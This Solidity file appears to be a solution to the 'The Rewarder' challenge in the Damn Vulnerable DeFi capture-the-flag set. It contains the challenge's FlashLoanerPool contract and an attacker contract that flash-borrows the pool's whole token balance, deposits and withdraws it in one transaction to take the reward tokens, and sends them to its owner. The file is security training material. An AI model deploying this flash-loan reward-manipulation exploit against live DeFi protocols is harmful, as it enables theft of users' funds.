// SPDX-License-Identifier: MIT

pragma solidity ^0.8.0;

import "@openzeppelin/contracts/security/ReentrancyGuard.sol";
import "@openzeppelin/contracts/utils/Address.sol";
import "../DamnValuableToken.sol";

import "./RewardToken.sol";
import "./TheRewarderPool.sol";

/**
 * @title FlashLoanerPool
 * @author Damn Vulnerable DeFi (https://damnvulnerabledefi.xyz)

 * @dev A simple pool to get flash loans of DVT
 */
contract FlashLoanerPool is ReentrancyGuard {

    using Address for address;

    DamnValuableToken public immutable liquidityToken;

    constructor(address liquidityTokenAddress) {
        liquidityToken = DamnValuableToken(liquidityTokenAddress);
    }

    function flashLoan(uint256 amount) external nonReentrant {
        uint256 balanceBefore = liquidityToken.balanceOf(address(this));
        require(amount <= balanceBefore, "Not enough token balance");

        require(msg.sender.isContract(), "Borrower must be a deployed contract");
        
        liquidityToken.transfer(msg.sender, amount);

        msg.sender.functionCall(
            abi.encodeWithSignature(
                "receiveFlashLoan(uint256)",
                amount
            )
        );

        require(liquidityToken.balanceOf(address(this)) >= balanceBefore, "Flash loan not paid back");
    }
}

contract TheRewarderPoolAttacker {
    address private _owner;
    address private _flashLoanPool;
    address private _rewarderPool;
    address private _dvtToken;
    address private _rewardToken;

    constructor(
        address flashLoanPool,
        address rewarderPool,
        address dvtToken,
        address rewardToken
    ) {
        _owner = msg.sender;
        _flashLoanPool = flashLoanPool;
        _rewarderPool = rewarderPool;
        _dvtToken = dvtToken;
        _rewardToken = rewardToken;
    }

    function attack() external {
        uint DVTPoolBalance = DamnValuableToken(_dvtToken).balanceOf(_flashLoanPool);

        DamnValuableToken(_dvtToken).approve(_rewarderPool, DVTPoolBalance);
        FlashLoanerPool(_flashLoanPool).flashLoan(DVTPoolBalance);
    }

    function receiveFlashLoan(uint256 amount) external {
        TheRewarderPool(_rewarderPool).deposit(amount);
        TheRewarderPool(_rewarderPool).withdraw(amount);
        require(DamnValuableToken(_dvtToken).transfer(_flashLoanPool, amount), "Cannot pay back");
        require(RewardToken(_rewardToken).transfer(_owner, RewardToken(_rewardToken).balanceOf(address(this))), "Cannot transfer RWT");
    }
}
